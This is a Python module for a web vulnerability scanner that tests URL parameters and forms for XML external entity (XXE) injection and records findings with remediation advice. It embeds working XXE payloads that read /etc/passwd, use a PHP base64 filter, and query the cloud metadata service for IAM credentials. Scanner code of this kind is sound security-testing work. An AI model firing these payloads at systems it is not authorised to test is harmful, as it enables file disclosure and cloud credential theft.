"""
XXE vulnerability scanner module.
"""
from typing import Dict, Any, List
from urllib.parse import urlparse, parse_qs
from utils import log_message, display_task_start, display_task_complete
from utils.http_client import HTTPClient
import time

def run(target: str, options: Dict[str, Any], ctx) -> List[Dict[str, Any]]:
    """
    Test for XXE vulnerabilities in URL parameters.
    
    Args:
        target: Target URL to test
        options: Scan configuration options
        ctx: Scan context object
    
    Returns:
        List of vulnerability findings
    """
    findings = []
    
    # Test URL parameters for XXE
    findings.extend(test_xxe_url(target, options, ctx))
    
    return findings


def test_xxe_url(url: str, options: Dict[str, Any], ctx) -> List[Dict[str, Any]]:
    """Test URL parameters for XXE vulnerabilities with detailed evidence."""
    display_task_start("URL XXE Testing")
    findings = []
    
    parsed = urlparse(url)
    if not parsed.query:
        return findings
        
    # Look for parameters that might accept XML
    params = parse_qs(parsed.query)
    client = HTTPClient(timeout=options.get('timeout', 30))
    
    for param_name in params.keys():
        if any(xml_indicator in param_name.lower() for xml_indicator in ['xml', 'data', 'input']):
            test_payloads = [
                {
                    "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                    "description": "Local file read via external entity"
                },
                {
                    "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
                    "description": "Cloud metadata service access via external entity"
                },
                {
                    "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
                    "description": "PHP filter based file read"
                }
            ]
            
            for test_case in test_payloads:
                payload = test_case["payload"]
                test_params = params.copy()
                test_params[param_name] = payload
                new_query = "&".join([f"{k}={v}" for k, v in test_params.items()])
                test_url = url.replace(parsed.query, new_query)
                
                try:
                    response = client.get(test_url)
                    
                    # Check for indicators of XXE success
                    file_content_indicators = [
                        'root:', 'daemon:', 'bin:', 'sys:', 'etc/passwd'
                    ]
                    
                    aws_metadata_indicators = [
                        'instance-id', 'ami-id', 'security-credentials', 'meta-data'
                    ]
                    
                    base64_indicators = [
                        'root:x:0:0', 'daemon:x:1:1', 'base64'
                    ]
                    
                    evidence_found = None
                    impact_description = ""
                    attack_type = ""
                    
                    # Local file read detection
                    if any(indicator in response.text for indicator in file_content_indicators):
                        evidence_found = f"XXE payload read local system file"
                        impact_description = "Local file system access achieved"
                        attack_type = "local file read"
                    
                    # Cloud metadata access detection
                    elif any(indicator in response.text for indicator in aws_metadata_indicators):
                        evidence_found = f"XXE payload accessed cloud metadata"
                        impact_description = "Cloud instance metadata exposed"
                        attack_type = "cloud metadata access"
                    
                    # Base64 encoded content detection
                    elif any(indicator in response.text for indicator in base64_indicators):
                        evidence_found = f"XXE payload retrieved base64 encoded file content"
                        impact_description = "File content extracted via encoding"
                        attack_type = "encoded file read"
                    
                    # XML parsing errors (potential XXE configuration)
                    elif any(error in response.text for error in ['xml', 'parser', 'entity', 'DOCTYPE']):
                        evidence_found = f"XXE payload caused XML parsing behavior"
                        impact_description = "XML parser configuration may be vulnerable"
                        attack_type = "parser detection"
                    
                    if evidence_found:
                        finding = {
                            "type": "XML External Entity Injection Vulnerability",
                            "severity": "Critical",
                            "url": test_url,
                            "evidence": f"{evidence_found} in parameter '{param_name}'. {test_case['description']}. {impact_description}.",
                            "description": "The application is vulnerable to XML External Entity attacks, allowing unauthorized file system access and server-side request forgery via XML parsing.",
                            "remediation": "Disable external entity processing in XML parsers. Use SAX parsers instead of DOM parsers. Implement strict XML schema validation. Use allow lists for XML content.",
                            "request_data": f"GET {test_url}",
                            "response_preview": f"Status: {response.status_code} | XXE exploitation: {evidence_found is not None}",
                            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
                        }
                        findings.append(finding)
                        ctx.record_vulnerability(finding)
                        break
                        
                except Exception as e:
                    log_message(f"Error testing XXE on URL {url}: {e}")
    
    display_task_complete("URL XXE Testing")
    return findings


def test_xxe_form(form: Dict[str, Any], page_url: str, options: Dict[str, Any], ctx) -> List[Dict[str, Any]]:
    """Test forms for XXE vulnerabilities with detailed evidence."""
    findings = []
    
    if not ctx.is_same_domain(form['action']):
        return findings
        
    display_task_start("XXE Testing")
    
    test_payloads = [
        {
            "payload": '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            "description": "Local file read via external entity"
        },
        {
            "payload": '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><foo>&xxe;</foo>',
            "description": "Cloud metadata service access via external entity"
        }
    ]
    
    client = HTTPClient(timeout=options.get('timeout', 30))
    
    for test_case in test_payloads:
        payload = test_case["payload"]
        # Try to submit as XML if content-type suggests it might work
        headers = {'Content-Type': 'application/xml'}
        
        try:
            response = client.post(form['action'], data=payload, headers=headers)
            
            # Check for indicators of XXE success
            if any(indicator in response.text for indicator in ['root:', 'aws', 'meta-data']):
                finding = {
                    "type": "XML External Entity Injection Vulnerability",
                    "severity": "Critical",
                    "url": form['action'],
                    "evidence": f"XXE payload triggered response with sensitive data. {test_case['description']}. External entity processing enabled.",
                    "description": "The application is vulnerable to XXE attacks via XML input processing, allowing file system access and server-side request forgery.",
                    "remediation": "Disable external entity processing in XML parsers. Implement strict XML input validation. Use safer data formats like JSON when possible.",
                    "request_data": payload,
                    "response_preview": response.text[:500],
                    "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
                }
                findings.append(finding)
                ctx.record_vulnerability(finding)
                break
                
        except Exception as e:
            # XXE testing often fails due to content-type issues, which is expected
            continue
    
    display_task_complete("XXE Testing")
    return findings